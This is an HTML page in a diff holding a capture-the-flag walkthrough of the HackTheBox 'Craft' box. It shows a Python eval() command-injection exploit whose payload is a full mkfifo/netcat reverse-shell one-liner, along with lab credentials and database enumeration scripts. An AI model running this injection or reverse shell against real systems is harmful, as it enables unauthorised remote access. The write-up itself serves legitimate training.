@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <a id="h1-1" name="h1-1"></a><strong></strong>
+        <h1><strong>hackthebox Craft</strong></h1>
+        <em>Released: July 2019 / Pwned: August 19th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Craft is a reasonably close-to-life box and what to do next is always fairly clear based on the information you find.<br>
+        You find an API repository for an app called <code>Craft</code> that exposes credentials and a command injection vulnerability in its commits. Using those, you spawn a shell in docker environment. Instead of trying to escape, you modify a script already present on the system to retrieve some credentials from <code>Craft</code>'s mysql database. You then return to the API repository and log in using the new credentials, grab an ssh key from a user's private repo and grab user.txt. To get root, you use a token which gives you authenticated access to a program called Vault. You use Vault to ssh into a root shell.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Modify <code>/etc/hosts</code> to access website subdomains<br>
+        • Visit gogs.craft.htb and <code>craft_api</code> repository<br>
+        • Browse <code>tests</code> &gt; <code>test.py</code> and view an old version of it to find credentials<br>
+        • Browse Issues &gt; Bogus ABV Values and read the pushed fix to find a python command injection vulnerability<br>
+        • Spawn a shell by modifying <code>test.py</code> to run python code which spawns a reverse shell<br>
+        • Modify <code>dbtest.py</code> already present in the docker environment to grab credentials from the <code>user</code> table in the mysql database<br>
+        • Log in as <code>gilfoy</code> on gogs.craft.htb and grab his ssh private key from his private <code>craft_infra</code> repo<br>
+        • Use the <code>.vault-token</code> in <code>gilfoy</code>'s home to authenticate with <code>vault</code> and run <code>vault ssh</code> to ssh into a root shell<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.110</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/craft#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/craft#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.110<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.110<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.039s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;998&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.4p1&nbsp;Debian&nbsp;10+deb9u5&nbsp;(protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33&nbsp;(ED25519)<br>
+                443/tcp&nbsp;open&nbsp;&nbsp;ssl/http&nbsp;nginx&nbsp;1.15.8<br>
+                |_http-server-header:&nbsp;nginx/1.15.8<br>
+                |_http-title:&nbsp;About<br>
+                |&nbsp;ssl-cert:&nbsp;Subject:&nbsp;commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US<br>
+                |&nbsp;Not&nbsp;valid&nbsp;before:&nbsp;2019-02-06T02:25:47<br>
+                |_Not&nbsp;valid&nbsp;after:&nbsp;&nbsp;2020-06-20T02:25:47<br>
+                |_ssl-date:&nbsp;ERROR:&nbsp;Script&nbsp;execution&nbsp;failed&nbsp;(use&nbsp;-d&nbsp;to&nbsp;debug)<br>
+                |&nbsp;tls-alpn:&nbsp;<br>
+                |_&nbsp;&nbsp;http/1.1<br>
+                |&nbsp;tls-nextprotoneg:&nbsp;<br>
+                |_&nbsp;&nbsp;http/1.1<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • 22/ssh - SSH isn't of any use at this point, but good to note for later<br>
+        • 443/http - A website! And the only port worth investigating<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 443/https - craft.htb</strong></h2><br>
+        Visit the website.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) /etc/hosts</strong></h3><br>
+        If you hover the icons in the top right, you'll notice there are 2 subdomains to this site.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        • <code>https://api.craft.htb/api</code><br>
+        • <code>https://gogs.craft.htb</code><br>
+        <br>
+        Add these 2 subdomains to your /etc/hosts file so that you can access them.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/craft#&nbsp;nano&nbsp;/etc/hosts<br>
+                ...<br>
+                <br>
+                #&nbsp;The&nbsp;following&nbsp;lines&nbsp;are&nbsp;desirable&nbsp;for&nbsp;IPv6&nbsp;capable&nbsp;hosts<br>
+                ::1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;localhost&nbsp;ip6-localhost&nbsp;ip6-loopback<br>
+                ff02::1&nbsp;ip6-allnodes<br>
+                ff02::2&nbsp;ip6-allrouters<br>
+                10.10.10.110&nbsp;craft.htb<br>
+                10.10.10.110&nbsp;api.craft.htb<br>
+                10.10.10.110&nbsp;gogs.craft.htb
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) gogs.craft.htb</strong></h2><br>
+        If you visit <code>gogs.craft.htb</code> you'll find a repository called <code>craft_api</code> which, as described on the homepage, is most likely the REST API for the Craft database.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>3a) gogs / craft_api - tests</strong></h3><br>
+        If you browse to <code>tests</code>, you'll find a <code>test.py</code> script.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        This script:<br>
+        • generates an API token from a provided username and password - r<code>esponse = requests.get('https://api.craft.htb/api/auth/login', auth=('', ''), verify=False)</code><br>
+        • creates a <code>bullshit</code> brew with a bogus ABV value<br>
+        • and creates a <code>bullshit</code> brew with a valid ABV value<br>
+        <br>
+        If we use this script as-is, it will fail because we don't have a username and password to generate a token.<br>
+        <br>
+        Instead of clicking <code>test.py</code>, follow the link to <code>a2d28ed155</code> to view the changes made to this file.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        In this old version of the file, you'll find a username and password.<br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        <code>dinesh</code> / <code>4aUh0A8PbVJxgd</code><br>
+        <br>
+        At this point, we have a valid username and password that will let us interact with the API as an authenticated user.<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>3b) gogs / craft_api - Issues</strong></h3><br>
+        If you check the repository's <code>Issues</code>, you'll find a <code>Bogus ABV Value</code> entry.<br>
+        Dinesh describes that users can submit invalid <code>abv</code> values when pushing data to the database via the API.<br>
+        According to the conversation, he pushes a fix.<br>
+        <br>
+        But Gilfoyle says that the fix could allow for “something awful†to happen.<br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        If you follow the link to the fix provided by Dinesh - <code>c414b16057</code> - you'll see the mistake.<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        The problem is this line - <code>if eval('%s &gt; 1' % request.json['abv']):</code><br>
+        <br>
+        <code>eval()</code> is a python function that will evaluate python code inside of it.<br>
+        For example, <code>eval(1 + 2)</code> will return <code>3</code>.<br>
+        <br>
+        <code>%s</code> allows us to inject python code.<br>
+        <code>% requst.json['abv']</code> means that python will take the value in <code>abv</code> from your JSON request to the API, and insert it into the command at <code>%</code>.<br>
+        For example, if you submit <code>abv = 12</code> to the API, the <code>if eval('%s &gt; 1')</code> command will become <code>if eval('12 &gt; 1')</code>.<br>
+        <br>
+        Because of this command injection vulnerability, we can run python code on the server and spawn a reverse shell.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Reverse Shell</strong></h2><br>
+        We can use the <code>test.py</code> script that we found earlier to submit a malicious ABV value and receive a reverse shell.<br>
+        <br>
+        <strong>What python code/command to inject?</strong><br>
+        In python, you would normally use <code>os.system("&lt;command&gt;")</code> to inject/run linux system commands.<br>
+        Unfortunately, <code>test.py</code> doesn't have the <code>os</code> library imported, so that option is unavailable to us.<br>
+        <br>
+        However, there's a global <code>__import__()</code> function in python that will import a library for you.<br>
+        <code>__import__('os')</code> will import the <code>os</code> library and will return a reference to this module so that we can use it.<br>
+        <br>
+        For example, we could run <code>__import__("os").system("nc &lt;attacker ip&gt; &lt;attacker port&gt; -e /bin/sh")</code> which would spawn a reverse shell that connects back to our attacking system.<br>
+        <br>
+        This netcat reverse shell won't work. I'm not sure why ¯\_(ツ)_/¯<br>
+        Instead, we can use a go-to alternative reverse shell for when <code>nc</code> doesn't work/you think it's being blocked:<br>
+        <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/h -i 2&gt;&amp;1|nc 10.10.14.4 9001 &gt;/tmp/f</code><br>
+        <br>
+        Our injected python command will be this:<br>
+        <code>__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/h -i 2&gt;&amp;1|nc 10.10.14.4 9001 &gt;/tmp/f")</code><br>
+        <br>
+        You can read more about exploiting python's <code>eval()</code> function from this guy - <a href="https://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html">https://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html</a><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>4a) Modify test.py</strong></h3><br>
+        1) Add Dinesh's username and password into the script at <code>auth=('', '')</code>.<br>
+        <br>
+        2) Add<br>
+            <div class="codebox">
+                from&nbsp;requests.packages.urllib3.exceptions&nbsp;import&nbsp;InsecureRequestWarning<br>
+                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+            </div>
+        </div><br>
+        into the script to suppress any https/443 warnings.<br>
+        <br>
+        3) And replace the ABV value in one of the brews with your injected command<br>
+        <code>brew_dict['abv'] = '__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.4 9001 &gt;/tmp/f")'</code><br>
+        <br>
+        Change <code>nc 10.10.14.4 9001</code> in the above with the IP and soon-to-be listening port of your attacking machine.<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#!/usr/bin/env&nbsp;python</span><br>
+                <br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;json<br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;requests.packages.urllib3.exceptions&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;InsecureRequestWarning<br>
+                <br>
+                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>
+                <br>
+                response&nbsp;=&nbsp;requests.get(<span style="color:#3ad900;font-weight:400">'https://api.craft.htb/api/auth/login'</span>,&nbsp;&nbsp;auth=(<span style="color:#3ad900;font-weight:400">'dinesh'</span>,&nbsp;<span style="color:#3ad900;font-weight:400">'4aUh0A8PbVJxgd'</span>),&nbsp;verify=<span style="color:#ff0044;font-weight:400">False</span>)<br>
+                json_response&nbsp;=&nbsp;json.loads(response.text)<br>
+                token&nbsp;=&nbsp;&nbsp;json_response[<span style="color:#3ad900;font-weight:400">'token'</span>]<br>
+                <br>
+                headers&nbsp;=&nbsp;{&nbsp;<span style="color:#3ad900;font-weight:400">'X-Craft-API-Token'</span>:&nbsp;token,&nbsp;<span style="color:#3ad900;font-weight:400">'Content-Type'</span>:&nbsp;<span style="color:#3ad900;font-weight:400">'application/json'</span>&nbsp;&nbsp;}<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;make&nbsp;sure&nbsp;token&nbsp;is&nbsp;valid</span><br>
+                response&nbsp;=&nbsp;requests.get(<span style="color:#3ad900;font-weight:400">'https://api.craft.htb/api/auth/check'</span>,&nbsp;headers=headers,&nbsp;verify=<span style="color:#ff0044;font-weight:400">False</span>)<br>
+                <span style="color:#ff9d00;font-weight:700">print</span>(response.text)<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;create&nbsp;a&nbsp;sample&nbsp;brew&nbsp;with&nbsp;bogus&nbsp;ABV...&nbsp;should&nbsp;fail.</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">"Create&nbsp;bogus&nbsp;ABV&nbsp;brew"</span>)<br>
+                brew_dict&nbsp;=&nbsp;{}<br>
+                brew_dict[<span style="color:#3ad900;font-weight:400">'abv'</span>]&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'15'</span><br>
+                brew_dict[<span style="color:#3ad900;font-weight:400">'name'</span>]&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'bullshit'</span><br>
+                brew_dict[<span style="color:#3ad900;font-weight:400">'brewer'</span>]&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'bullshit'</span><br>
+                brew_dict[<span style="color:#3ad900;font-weight:400">'style'</span>]&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'bullshit'</span><br>
+                <br>
+                json_data&nbsp;=&nbsp;json.dumps(brew_dict)<br>
+                response&nbsp;=&nbsp;requests.post(<span style="color:#3ad900;font-weight:400">'https://api.craft.htb/api/brew/'</span>,&nbsp;headers=headers,&nbsp;data=json_data,&nbsp;verify=<span style="color:#ff0044;font-weight:400">False</span>)<br>
+                <span style="color:#ff9d00;font-weight:700">print</span>(response.text)<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;create&nbsp;a&nbsp;sample&nbsp;brew&nbsp;with&nbsp;real&nbsp;ABV...&nbsp;should&nbsp;succeed.</span><br>
+                <span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">"Create&nbsp;real&nbsp;ABV&nbsp;brew"</span>)<br>
+                brew_dict&nbsp;=&nbsp;{}<br>
+                brew_dict[<span style="color:#3ad900;font-weight:400">'abv'</span>]&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'__import__("os").system("rm&nbsp;/tmp/f;mkfifo&nbsp;/tmp/f;cat&nbsp;/tmp/f|/bin/sh&nbsp;-i&nbsp;2&gt;&amp;1|nc&nbsp;10.10.14.4&nbsp;9001&nbsp;&gt;/tmp/f")'</span><br>
+                brew_dict[<span style="color:#3ad900;font-weight:400">'name'</span>]&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'bullshit'</span><br>
+                brew_dict[<span style="color:#3ad900;font-weight:400">'brewer'</span>]&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'bullshit'</span><br>
+                brew_dict[<span style="color:#3ad900;font-weight:400">'style'</span>]&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'bullshit'</span><br>
+                <br>
+                json_data&nbsp;=&nbsp;json.dumps(brew_dict)<br>
+                response&nbsp;=&nbsp;requests.post(<span style="color:#3ad900;font-weight:400">'https://api.craft.htb/api/brew/'</span>,&nbsp;headers=headers,&nbsp;data=json_data,&nbsp;verify=<span style="color:#ff0044;font-weight:400">False</span>)<br>
+                <span style="color:#ff9d00;font-weight:700">print</span>(response.text)
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>4b) Get shell</strong></h3><br>
+        Start a reverse shell on your attacking machine and run your modified <code>test.py</code> script.<br>
+        You should receive a call back on your listener, and have a shell!<br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/craft#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/craft#&nbsp;python&nbsp;test.py<br>
+                {"message":"Token&nbsp;is&nbsp;valid!"}<br>
+                <br>
+                Create&nbsp;bogus&nbsp;ABV&nbsp;brew<br>
+                "ABV&nbsp;must&nbsp;be&nbsp;a&nbsp;decimal&nbsp;value&nbsp;less&nbsp;than&nbsp;1.0"<br>
+                <br>
+                Create&nbsp;real&nbsp;ABV&nbsp;brew<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                ...<br>
+                connect&nbsp;to&nbsp;[10.10.14.4]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.110]&nbsp;46313<br>
+                /bin/sh:&nbsp;can't&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                /opt/app&nbsp;#&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Docker Jail</strong></h2><br>
+        If you list the hidden files at the root of the filesystem, you'll see that you're in a docker environment.<br>
+            <div class="codebox">
+                /opt/app/craft_api&nbsp;#&nbsp;ls&nbsp;-alh&nbsp;/<br>
+                total&nbsp;68<br>
+                drwxr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Aug&nbsp;19&nbsp;08:52&nbsp;.<br>
+                drwxr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Aug&nbsp;19&nbsp;08:52&nbsp;..<br>
+                -rwxr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Feb&nbsp;10&nbsp;&nbsp;2019&nbsp;.dockerenv<br>
+                drwxr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Aug&nbsp;19&nbsp;08:54&nbsp;.ssh<br>
+                drwxr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Feb&nbsp;&nbsp;6&nbsp;&nbsp;2019&nbsp;bin<br>
+                drwxr-xr-x&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;340&nbsp;Aug&nbsp;18&nbsp;19:59&nbsp;dev<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Another give away is seeing next to no users in <code>/etc/passwd</code>, the lack of any /home directories, and the fact that you're root within this docker environment but can't seem to find a <code>root.txt</code>.<br>
+        <br>
+        <code>/opt/app</code>, where the reverse shell drops you, is the <code>Craft</code> app's root directory.<br>
+        You should recognise the files and folder structure from what you saw on the gogs repository.<br>
+        <br>
+        Inside <code>craft_api</code> you'll find <code>settings.py</code>, which contains the craft database's username and password.<br>
+            <div class="codebox">
+                /opt/app&nbsp;#&nbsp;ls<br>
+                app.py<br>
+                craft_api<br>
+                dbtest.py<br>
+                tests<br>
+                /opt/app&nbsp;#&nbsp;cd&nbsp;craft_api<br>
+                /opt/app/craft_api&nbsp;#&nbsp;ls<br>
+                __init__.py<br>
+                __pycache__<br>
+                api<br>
+                database<br>
+                settings.py<br>
+                /opt/app/craft_api&nbsp;#&nbsp;cat&nbsp;settings.py<br>
+                #&nbsp;Flask&nbsp;settings<br>
+                FLASK_SERVER_NAME&nbsp;=&nbsp;'api.craft.htb'<br>
+                FLASK_DEBUG&nbsp;=&nbsp;False&nbsp;&nbsp;#&nbsp;Do&nbsp;not&nbsp;use&nbsp;debug&nbsp;mode&nbsp;in&nbsp;production<br>
+                <br>
+                #&nbsp;Flask-Restplus&nbsp;settings<br>
+                RESTPLUS_SWAGGER_UI_DOC_EXPANSION&nbsp;=&nbsp;'list'<br>
+                RESTPLUS_VALIDATE&nbsp;=&nbsp;True<br>
+                RESTPLUS_MASK_SWAGGER&nbsp;=&nbsp;False<br>
+                RESTPLUS_ERROR_404_HELP&nbsp;=&nbsp;False<br>
+                CRAFT_API_SECRET&nbsp;=&nbsp;'hz66OCkDtv8G6D'<br>
+                <br>
+                #&nbsp;database<br>
+                MYSQL_DATABASE_USER&nbsp;=&nbsp;'craft'<br>
+                MYSQL_DATABASE_PASSWORD&nbsp;=&nbsp;'qLGockJ6G2J75O'<br>
+                MYSQL_DATABASE_DB&nbsp;=&nbsp;'craft'<br>
+                MYSQL_DATABASE_HOST&nbsp;=&nbsp;'db'<br>
+                SQLALCHEMY_TRACK_MODIFICATIONS&nbsp;=&nbsp;False
+            </div>
+        </div><br>
+        <br>
+        But we don't need to use the database username and password manually.<br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>5a) dbtest.py</strong></h3><br>
+        In <code>/opt/app</code> there's a <code>dbtest.py</code> script which will run sql commands against the database.<br>
+            <div class="codebox">
+                /opt/app&nbsp;#&nbsp;cat&nbsp;dbtest.py<br>
+                #!/usr/bin/env&nbsp;python<br>
+                <br>
+                import&nbsp;pymysql<br>
+                from&nbsp;craft_api&nbsp;import&nbsp;settings<br>
+                <br>
+                #&nbsp;test&nbsp;connection&nbsp;to&nbsp;mysql&nbsp;database<br>
+                <br>
+                connection&nbsp;=&nbsp;pymysql.connect(host=settings.MYSQL_DATABASE_HOST,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user=settings.MYSQL_DATABASE_USER,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password=settings.MYSQL_DATABASE_PASSWORD,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db=settings.MYSQL_DATABASE_DB,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cursorclass=pymysql.cursors.DictCursor)<br>
+                <br>
+                try:&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;connection.cursor()&nbsp;as&nbsp;cursor:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sql&nbsp;=&nbsp;"SELECT&nbsp;`id`,&nbsp;`brewer`,&nbsp;`name`,&nbsp;`abv`&nbsp;FROM&nbsp;`brew`&nbsp;LIMIT&nbsp;1"<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cursor.execute(sql)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;cursor.fetchone()<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(result)<br>
+                <br>
+                finally:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;connection.close()
+            </div>
+        </div><br>
+        <br>
+        We can modify <code>sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"</code> to run any sql command we like.<br>
+        And we can change <code>result = cursor.fetchone()</code> to <code>result = cursor.fetchall()</code> to receive all output from the command, not just 1 result.<br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>5b) dbtest.py - Retrieve tables</strong></h3><br>
+        First, find what tables are available in the database.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/craft#&nbsp;nano&nbsp;iteration1.py
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#!/usr/bin/env&nbsp;python</span><br>
+                <br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;pymysql<br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;craft_api&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;settings<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;test&nbsp;connection&nbsp;to&nbsp;mysql&nbsp;database</span><br>
+                <br>
+                connection&nbsp;=&nbsp;pymysql.connect(host=settings.MYSQL_DATABASE_HOST,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user=settings.MYSQL_DATABASE_USER,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password=settings.MYSQL_DATABASE_PASSWORD,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db=settings.MYSQL_DATABASE_DB,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cursorclass=pymysql.cursors.DictCursor)<br>
+                <br>
+                try:&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;connection.cursor()&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;cursor:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sql&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"show&nbsp;tables"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cursor.execute(sql)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;cursor.fetchall()&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;originally&nbsp;cursor.fetchone()</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(result)<br>
+                <br>
+                finally:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;connection.close()
+            </div>
+        </div><br>
+        <br>
+        Serve the sql script to the target using <code>python -m SimpleHTTPServer</code> and download it with <code>wget</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/craft#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
